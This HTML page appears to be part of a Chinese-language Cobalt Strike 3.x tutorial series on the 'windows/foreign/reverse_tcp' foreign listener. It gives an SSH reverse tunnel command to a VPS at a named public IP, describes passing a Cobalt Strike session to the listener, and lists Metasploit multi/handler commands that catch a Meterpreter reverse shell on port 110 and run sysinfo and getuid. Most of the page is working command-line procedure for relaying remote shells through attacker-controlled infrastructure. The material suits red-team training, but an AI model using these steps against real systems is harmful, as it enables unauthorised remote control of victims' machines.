<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="windowsforeignreversetcp--反向-tcp-外部监听器-"><span class="csB2D98684">windows/foreign/reverse_tcp [ </span><span class="cs83F14626">反向</span><span class="csB2D98684"> tcp </span><span class="cs83F14626">外部监听器</span><span class="csB2D98684"> ]</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">跟上面差不多</span><span class="cs8926E06">,</span><span class="cs9C1B1871">只不过这次换了下协议而已</span><span class="cs8926E06">,</span><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">还是先把本地和</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">之间的</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道打通</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体操作如下</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ssh -C -f -N -g -R 0.0.0.0:110:192.168.3.57:110 root@45.63.121.57 -p 22</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ps -ef | grep &quot;192.168.3.57&quot;</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_tcp%20[%20%e5%8f%8d%e5%90%91%20tcp%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image0.png" width="560" height="105" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">而后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">创建一个</span><span class="cs8926E06"> reverse_tcp </span><span class="cs9C1B1871">的外部监听器</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_tcp%20[%20%e5%8f%8d%e5%90%91%20tcp%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image1.png" width="560" height="239" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">继续使用派生功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将其派生到</span><span class="cs8926E06"> reverse_tcp </span><span class="cs9C1B1871">这个外部监听器上</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_tcp%20[%20%e5%8f%8d%e5%90%91%20tcp%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image2.png" width="560" height="314" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">稍等片刻</span><span class="cs8926E06">,</span><span class="cs9C1B1871">便会看到本地</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">上线</span><span class="cs8926E06">,</span><span class="cs9C1B1871">注意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处外部监听器用的是</span><span class="cs8926E06"> tcp </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 110 </span><span class="cs9C1B1871">端口</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那么你后面的</span><span class="cs8926E06"> meterpreter payload </span><span class="cs9C1B1871">也一定要用</span><span class="cs8926E06"> tcp </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 110 </span><span class="cs9C1B1871">端口</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样数据才能正常对接交换</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf5 &gt; use exploit/multi/handler</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set payload windows/meterpreter/reverse_tcp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set lhost 192.168.3.57</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set lport 110</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set exitonsession false</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; exploit -j</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; sessions -i 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">meterpreter &gt; sysinfo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">meterpreter &gt; getuid</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
